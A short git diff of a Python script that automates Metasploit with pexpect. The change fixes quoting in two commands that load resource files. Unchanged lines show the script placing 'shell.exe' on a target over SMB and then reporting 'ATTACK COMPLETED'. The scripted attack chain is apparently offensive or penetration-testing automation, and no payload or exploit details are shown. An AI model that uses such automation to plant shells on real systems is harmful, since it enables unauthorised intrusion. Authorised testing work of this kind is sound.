@@ -15,7 +15,7 @@ metasploit_process.expect('msf6')
 print ("RUNNING RESOURCE 1")
 
 # Running resource1.rc
-metasploit_process.sendline(resource resource1.rc)
+metasploit_process.sendline('resource resource1.rc')
 metasploit_process.expect('auxiliary')
 
 #SMB client put shell.exe
@@ -30,7 +30,7 @@ metasploit_process.expect('auxiliary')
 print ("SHELL.EXE SUCCESSFULLY PLACED - RUNNING RESOURCE 2")
 
 # Running resource2.rc
-metasploit_process.sendline(resource resource2.rc)
+metasploit_process.sendline('resource resource2.rc')
 metasploit_process.expect('msf6')
 print ("ATTACK COMPLETED")
 metasploit_process.close()
